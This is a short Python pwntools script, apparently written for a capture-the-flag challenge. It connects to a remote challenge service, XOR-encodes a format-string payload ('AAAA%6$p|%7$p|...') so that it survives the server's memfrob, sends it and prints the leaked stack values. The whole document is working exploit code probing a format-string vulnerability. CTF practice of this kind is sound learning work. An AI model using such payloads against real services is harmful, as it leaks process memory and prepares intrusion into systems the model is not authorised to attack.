from pwn import *

def xor_payload(p):
    return bytes(b ^ 0x2A for b in p)

p = remote('chals.cyberjousting.com', 1367)
p.recvuntil(b'Attempt 1: ')

# This will arrive as 'AAAA%6$p' after memfrob
raw = b'AAAA%6$p|%7$p|%8$p|%9$p'
p.sendline(xor_payload(raw))
out = p.recvuntil(b'Try again.')
print(out)
p.close()
